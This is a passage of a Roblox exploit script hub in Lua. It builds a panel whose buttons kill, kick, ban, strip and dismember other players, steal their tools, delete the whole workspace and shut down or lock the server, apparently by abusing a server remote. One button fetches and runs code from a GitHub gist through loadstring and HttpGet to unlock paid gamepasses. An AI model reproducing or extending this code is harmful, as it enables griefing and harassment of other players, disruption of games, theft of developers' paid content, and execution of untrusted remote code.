		ImageLabel.BorderSizePixel = 0
		ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
		ImageLabel.Size = UDim2.new(0, 25, 0, 25)
		ImageLabel.Image = "http://www.roblox.com/asset/?id=8388262491"
		ImageLabel.ScaleType = Enum.ScaleType.Fit

		scripts.Name = "scripts"
		scripts.Parent = main
		scripts.Active = true
		scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
		scripts.BackgroundTransparency = 1
		scripts.BorderSizePixel = 0
		scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
		scripts.Size = UDim2.new(0, 325, 0, 173)
		scripts.CanvasSize = UDim2.new(0, 0, 1.150, 0)

		UIGridLayout.Parent = scripts
		UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIGridLayout.CellSize = UDim2.new(0, 100, 0, 30)

		kill.Name = "kill"
		kill.Parent = scripts
		kill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		kill.BorderSizePixel = 0
		kill.Size = UDim2.new(0, 200, 0, 50)
		kill.Font = Enum.Font.Roboto
		kill.Text = "Kill"
		kill.TextColor3 = Color3.fromRGB(255, 255, 255)
		kill.TextSize = 14.000

		kick.Name = "kick"
		kick.Parent = scripts
		kick.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		kick.BorderSizePixel = 0
		kick.Size = UDim2.new(0, 200, 0, 50)
		kick.Font = Enum.Font.Roboto
		kick.Text = "Kick"
		kick.TextColor3 = Color3.fromRGB(255, 255, 255)
		kick.TextSize = 14.000

		ban.Name = "ban"
		ban.Parent = scripts
		ban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ban.BorderSizePixel = 0
		ban.Size = UDim2.new(0, 200, 0, 50)
		ban.Font = Enum.Font.Roboto
		ban.Text = "Ban"
		ban.TextColor3 = Color3.fromRGB(255, 255, 255)
		ban.TextSize = 14.000

		unban.Name = "unban"
		unban.Parent = scripts
		unban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		unban.BorderSizePixel = 0
		unban.Size = UDim2.new(0, 200, 0, 50)
		unban.Font = Enum.Font.Roboto
		unban.Text = "UnBan"
		unban.TextColor3 = Color3.fromRGB(255, 255, 255)
		unban.TextSize = 14.000

		goto.Name = "goto"
		goto.Parent = scripts
		goto.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		goto.BorderSizePixel = 0
		goto.Size = UDim2.new(0, 200, 0, 50)
		goto.Font = Enum.Font.Roboto
		goto.Text = "Goto"
		goto.TextColor3 = Color3.fromRGB(255, 255, 255)
		goto.TextSize = 14.000

		view.Name = "view"
		view.Parent = scripts
		view.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		view.BorderSizePixel = 0
		view.Size = UDim2.new(0, 200, 0, 50)
		view.Font = Enum.Font.Roboto
		view.Text = "View"
		view.TextColor3 = Color3.fromRGB(255, 255, 255)
		view.TextSize = 14.000

		unview.Name = "unview"
		unview.Parent = scripts
		unview.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		unview.BorderSizePixel = 0
		unview.Size = UDim2.new(0, 200, 0, 50)
		unview.Font = Enum.Font.Roboto
		unview.Text = "UnView"
		unview.TextColor3 = Color3.fromRGB(255, 255, 255)
		unview.TextSize = 14.000

		btools.Name = "btools"
		btools.Parent = scripts
		btools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		btools.BorderSizePixel = 0
		btools.Size = UDim2.new(0, 200, 0, 50)
		btools.Font = Enum.Font.Roboto
		btools.Text = "BTools"
		btools.TextColor3 = Color3.fromRGB(255, 255, 255)
		btools.TextSize = 14.000

		nuke.Name = "nuke"
		nuke.Parent = scripts
		nuke.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		nuke.BorderSizePixel = 0
		nuke.Size = UDim2.new(0, 200, 0, 50)
		nuke.Font = Enum.Font.Roboto
		nuke.Text = "Nuke"
		nuke.TextColor3 = Color3.fromRGB(255, 255, 255)
		nuke.TextSize = 14.000

		naked.Name = "naked"
		naked.Parent = scripts
		naked.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		naked.BorderSizePixel = 0
		naked.Size = UDim2.new(0, 200, 0, 50)
		naked.Font = Enum.Font.Roboto
		naked.Text = "Naked"
		naked.TextColor3 = Color3.fromRGB(255, 255, 255)
		naked.TextSize = 14.000

		faceless.Name = "faceless"
		faceless.Parent = scripts
		faceless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		faceless.BorderSizePixel = 0
		faceless.Size = UDim2.new(0, 200, 0, 50)
		faceless.Font = Enum.Font.Roboto
		faceless.Text = "Faceless"
		faceless.TextColor3 = Color3.fromRGB(255, 255, 255)
		faceless.TextSize = 14.000

		nolimbs.Name = "nolimbs"
		nolimbs.Parent = scripts
		nolimbs.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		nolimbs.BorderSizePixel = 0
		nolimbs.Size = UDim2.new(0, 200, 0, 50)
		nolimbs.Font = Enum.Font.Roboto
		nolimbs.Text = "NoLimbs"
		nolimbs.TextColor3 = Color3.fromRGB(255, 255, 255)
		nolimbs.TextSize = 14.000

		hatless.Name = "hatless"
		hatless.Parent = scripts
		hatless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		hatless.BorderSizePixel = 0
		hatless.Size = UDim2.new(0, 200, 0, 50)
		hatless.Font = Enum.Font.Roboto
		hatless.Text = "Hatless"
		hatless.TextColor3 = Color3.fromRGB(255, 255, 255)
		hatless.TextSize = 14.000

		sink.Name = "sink"
		sink.Parent = scripts
		sink.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		sink.BorderSizePixel = 0
		sink.Size = UDim2.new(0, 200, 0, 50)
		sink.Font = Enum.Font.Roboto
		sink.Text = "Sink"
		sink.TextColor3 = Color3.fromRGB(255, 255, 255)
		sink.TextSize = 14.000

		rtools.Name = "rtools"
		rtools.Parent = scripts
		rtools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		rtools.BorderSizePixel = 0
		rtools.Size = UDim2.new(0, 200, 0, 50)
		rtools.Font = Enum.Font.Roboto
		rtools.Text = "Rtools"
		rtools.TextColor3 = Color3.fromRGB(255, 255, 255)
		rtools.TextSize = 14.000

		stools.Name = "stools"
		stools.Parent = scripts
		stools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		stools.BorderSizePixel = 0
		stools.Size = UDim2.new(0, 200, 0, 50)
		stools.Font = Enum.Font.Roboto
		stools.Text = "Stools"
		stools.TextColor3 = Color3.fromRGB(255, 255, 255)
		stools.TextSize = 14.000

		slock.Name = "slock"
		slock.Parent = scripts
		slock.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		slock.BorderSizePixel = 0
		slock.Size = UDim2.new(0, 200, 0, 50)
		slock.Font = Enum.Font.Roboto
		slock.Text = "Slock"
		slock.TextColor3 = Color3.fromRGB(255, 255, 255)
		slock.TextSize = 14.000

		player.Name = "player"
		player.Parent = main
		player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
		player.BorderSizePixel = 0
		player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
		player.Size = UDim2.new(0, 310, 0, 23)
		player.ClearTextOnFocus = false
		player.Font = Enum.Font.SourceSans
		player.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
		player.PlaceholderText = "PLAYER"
		player.Text = ""
		player.TextColor3 = Color3.fromRGB(255, 255, 255)
		player.TextSize = 14.000

		ragdoll.Name = "ragdoll"
		ragdoll.Parent = scripts
		ragdoll.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ragdoll.BorderSizePixel = 0
		ragdoll.Position = UDim2.new(0, 0, 0.898455501, 0)
		ragdoll.Size = UDim2.new(0, 100, 0, 24)
		ragdoll.Font = Enum.Font.SourceSans
		ragdoll.Text = "Ragdoll"
		ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
		ragdoll.TextSize = 14.000

		ranims.Name = "ranims"
		ranims.Parent = scripts
		ranims.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		ranims.BorderSizePixel = 0
		ranims.Position = UDim2.new(0, 0, 0.898455501, 0)
		ranims.Size = UDim2.new(0, 100, 0, 24)
		ranims.Font = Enum.Font.SourceSans
		ranims.Text = "Ranim"
		ranims.TextColor3 = Color3.fromRGB(255, 255, 255)
		ranims.TextSize = 14.000

		shutdown.Name = "shutdown"
		shutdown.Parent = scripts
		shutdown.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		shutdown.BorderSizePixel = 0
		shutdown.Size = UDim2.new(0, 200, 0, 50)
		shutdown.Font = Enum.Font.Roboto
		shutdown.Text = "Shutdown"
		shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
		shutdown.TextSize = 14.000

		punish.Name = "punish"
		punish.Parent = scripts
		punish.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		punish.BorderSizePixel = 0
		punish.Size = UDim2.new(0, 200, 0, 50)
		punish.Font = Enum.Font.Roboto
		punish.Text = "Punish"
		punish.TextColor3 = Color3.fromRGB(255, 255, 255)
		punish.TextSize = 14.000

		rchassis.Name = "rchassis"
		rchassis.Parent = scripts
		rchassis.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		rchassis.BorderSizePixel = 0
		rchassis.Size = UDim2.new(0, 200, 0, 50)
		rchassis.Font = Enum.Font.Roboto
		rchassis.Text = "Rchassis"
		rchassis.TextColor3 = Color3.fromRGB(255, 255, 255)
		rchassis.TextSize = 14.000

		local bannedPlayers = {}
		local serverlock = false
		local sdown = false
		local cam = workspace.CurrentCamera

		function GetBannedPlayer(target)
			local Found = {}
			for _, str in pairs(bannedPlayers) do
				if str:find(target) then
					table.insert(Found, str)
					break
				end
			end
			return Found
		end

		game:GetService("Players").PlayerAdded:Connect(function(plr)
			for i,v in pairs(bannedPlayers) do
				if plr.Name == v then
					Notify("Banned User", plr.Name .. " Tried to join the game", 5)
					work(plr)
				end
			end
			if serverlock == true then
				Notify("Join Attempt", plr.Name .. " Tried to join the game but the server is locked", 5)
				work(plr)
			end
			if sdown == true then
				work(plr)
			end
		end)

		btools.MouseButton1Click:Connect(function()
			local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
			local Equipped = false

			Tool.RequiresHandle = false
			Tool.Name = "Destroy Tool"
			local Field = Instance.new("SelectionBox",game.Workspace)
			local Mouse = game.Players.LocalPlayer:GetMouse()
			Field.LineThickness = 0.1
			Tool.TextureId = "http://www.roblox.com/asset/?id=12223874"
			Tool.Equipped:Connect(function()
				Equipped = true

				while Equipped == true do
					if Mouse.Target ~= nil then
						Field.Adornee = Mouse.Target
						Mouse.Icon = "rbxasset://textures/HammerCursor.png"
					else
						Field.Adornee = nil
						Mouse.Icon = ""
					end
					wait()
				end
			end)


			Tool.Unequipped:Connect(function()
				Equipped = false
				Field.Adornee = nil
				Mouse.Icon = ""
			end)

			Tool.Activated:Connect(function()
				if Mouse.Target ~= nil then
					print(Mouse.Target)
					remote:FireServer(Mouse.Target, {Value = Mouse.Target})
					local ex = Instance.new'Explosion'
					ex.BlastRadius = 0
					ex.Position = Mouse.Target.Position
					ex.Parent = workspace

					local AttemptTarget = Mouse.Target
					while AttemptTarget ~= nil do
						AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
						AttemptTarget.CanCollide = false
						wait()
					end
				end
			end)
		end)

		kill.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
						work(game:GetService("Players")[v].Character.Torso.Neck)
					else
						work(game:GetService("Players")[v].Character.Head.Neck)
					end
				end)
			end
		end)

		naked.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
					end)
				end
				if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
					end)
				end
				if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
					spawn(function()
						work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
					end)
				end
			end
		end)

		ranims.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
					work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
				end
			end
		end)

		nolimbs.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
						names = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
						for _, str in pairs(names) do
							work(game:GetService("Players")[v].Character[str])
						end
					else
						names = {"LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
						for _, str in pairs(names) do
							work(game:GetService("Players")[v].Character[str])
						end
					end
				end)
			end
		end)

		kick.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v])
				end)
			end
		end)

		nuke.MouseButton1Click:Connect(function()
			for i,c in pairs(game.Workspace:GetChildren()) do
				all = c
				work(all)
			end
		end)

		ban.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					if not table.find(bannedPlayers, v.Name) then
						plr = game:GetService("Players")[v]
						table.insert(bannedPlayers, plr.Name)
						Notify("Banned", plr.Name .. " Will not be able to join the server", 5)
						work(plr)
					end
				end)
			end
		end)

		unban.MouseButton1Click:Connect(function()
			for i,v in pairs(GetBannedPlayer(player.Text)) do
				spawn(function()
					table.remove(bannedPlayers, table.find(bannedPlayers, v))
					Notify("UnBanned", v .." Is now able to join the server", 5)
				end)
			end
		end)

		goto.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
			end
		end)

		sink.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					destr = game:GetService("Players")[v].Character["HumanoidRootPart"]
					work(destr)
				end)
			end
		end)

		faceless.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					destructwashere = game:GetService("Players")[v].Character.Head.face
					work(destructwashere)
				end)
			end
		end)

		hatless.MouseButton1Click:Connect(function()
			for i, v in pairs(GetPlayer(player.Text)) do
				for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
					if h:IsA("Accessory") then
						work(h)
					end
				end
			end
		end)

		ragdoll.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					e = game:GetService("Players")[v].Character:FindFirstChild("Humanoid")
					work(e)
				end)
			end
		end)

		local toggle = false

		slock.MouseButton1Click:Connect(function()
			if toggle == false then
				slock.Text = "UnSlock"
				Notify("Server Locked", "Nobody can join the server", 5)
				serverlock = true
				toggle = true
			elseif toggle == true then
				slock.Text = "Slock"
				Notify("Server Unlocked", "Anyone can join the server", 5)
				serverlock = false
				toggle = false
			end
		end)

		view.MouseButton1Click:Connect(function()
			for i, v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
					cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
				end
			end
		end)

		unview.MouseButton1Click:Connect(function()
			if LocalPlayer.Character:FindFirstChild("Humanoid") then
				cam.CameraSubject = LocalPlayer.Character.Humanoid
			end
		end)

		shutdown.MouseButton1Click:Connect(function()
			sdown = true
			Notify("Shutdown", "Shutdowning server..", 5)
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				spawn(function()
					if v.Name ~= LocalPlayer.Name then
						work(v)
						repeat wait() until not game:GetService("Players"):FindFirstChild(v)
						work(LocalPlayer)
					end
				end)
			end
		end)

		rtools.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					backpack = game:GetService("Players")[v]["Backpack"] or game:GetService("Players")[v]:WaitForChild("Backpack")
					for i,t in pairs(backpack:GetChildren()) do
						if t:IsA("BackpackItem") and t:FindFirstChild("Handle") then
							work(t)
						end
					end
				end)
			end
		end)

		stools.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid"))
					repeat wait() until game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
					for i,v in pairs(game:GetService("Players")[v].Character:GetChildren()) do
						if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
							LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
						end
					end
				end)
			end
		end)

		punish.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v].Character)
				end)
			end
		end)

		rchassis.MouseButton1Click:Connect(function()
			for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if string.match(v.Name, "Chassis") then
					work(v)
				end
			end
		end)
	end

end)

FeGamepass.Name = "FeGamepass"
FeGamepass.Parent = ScrollingFrame
FeGamepass.Size = UDim2.new(0, 137, 0, 23)
FeGamepass.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeGamepass.Position = UDim2.new(0.651315808, 0, 0.0922147781, 0)
FeGamepass.BorderSizePixel = 0
FeGamepass.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeGamepass.TextColor3 = Color3.fromRGB(0, 0, 0)
FeGamepass.Text = "FE Gamepass Giver"
FeGamepass.TextSize = 14
FeGamepass.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeGamepass.MouseButton1Down:Connect(function()
	NotifyModule:Notify("Fe GamePass Loaded Sometimes does not work", 5)
	loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()
end)

Close.Name = "Close"
Close.Parent = Main_2
Close.Size = UDim2.new(0, 123, 0, 13)
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.Position = UDim2.new(0.695175409, 0, 0, 0)
Close.BorderSizePixel = 0
Close.BackgroundColor3 = Color3.fromRGB(255, 94, 30)
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.Text = "Close"
Close.TextSize = 14
Close.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Close.MouseButton1Down:Connect(function()
	Open.Visible = true
	wait(1)
	Main_2.Visible = false
        NotifyModule:Notify("Closed!", 2)
end)

print("Main Frame Loaded")
print("Adding TouseefX Drag V1")

local UserInputService = game:GetService("UserInputService")

local gui = Main_2

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

print("Loaded")
NotifyModule:Notify("Thanks For Using More TouseefX Script Hub!:)", 5)
